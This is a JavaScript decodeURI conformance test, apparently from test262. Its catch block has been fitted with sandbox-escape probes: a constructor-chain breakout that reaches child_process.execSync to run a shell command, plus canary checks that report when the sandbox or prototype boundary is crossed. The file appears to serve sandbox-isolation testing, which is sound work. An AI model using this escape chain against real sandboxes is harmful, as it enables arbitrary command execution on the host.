try {
    var errorCount = 0;
    var count = 0;
    var indexP;
    var indexO = 0;
    for (var indexB1 = 224; indexB1 <= 239; indexB1++) {
        var hexB1 = decimalToPercentHexString(indexB1);
        for (var indexB2 = 128; indexB2 <= 191; indexB2++) {
            if (indexB1 === 224 && indexB2 <= 159)
                continue;
            if (indexB1 === 237 && 160 <= indexB2)
                continue;
            var hexB1_B2 = hexB1 + decimalToPercentHexString(indexB2);
            for (var indexB3 = 128; indexB3 <= 191; indexB3++) {
                count++;
                var hexB1_B2_B3 = hexB1_B2 + decimalToPercentHexString(indexB3);
                var index = (indexB1 & 15) * 4096 + (indexB2 & 63) * 64 + (indexB3 & 63);
                if (decodeURI(hexB1_B2_B3) === String.fromCharCode(index))
                    continue;
                if (indexO === 0) {
                    indexO = index;
                } else {
                    if (index - indexP !== 1) {
                        if (indexP - indexO !== 0) {
                            var hexP = decimalToHexString(indexP);
                            var hexO = decimalToHexString(indexO);
                            $ERROR('#' + hexO + '-' + hexP + ' ');
                        } else {
                            var hexP = decimalToHexString(indexP);
                            $ERROR('#' + hexP + ' ');
                        }
                        indexO = index;
                    }
                }
                indexP = index;
                errorCount++;
            }
        }
    }
    if (errorCount > 0) {
        if (indexP - indexO !== 0) {
            var hexP = decimalToHexString(indexP);
            var hexO = decimalToHexString(indexO);
            $ERROR('#' + hexO + '-' + hexP + ' ');
        } else {
            var hexP = decimalToHexString(indexP);
            $ERROR('#' + hexP + ' ');
        }
        $ERROR('Total error: ' + errorCount + ' bad Unicode character in ' + count + ' ');
    }
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}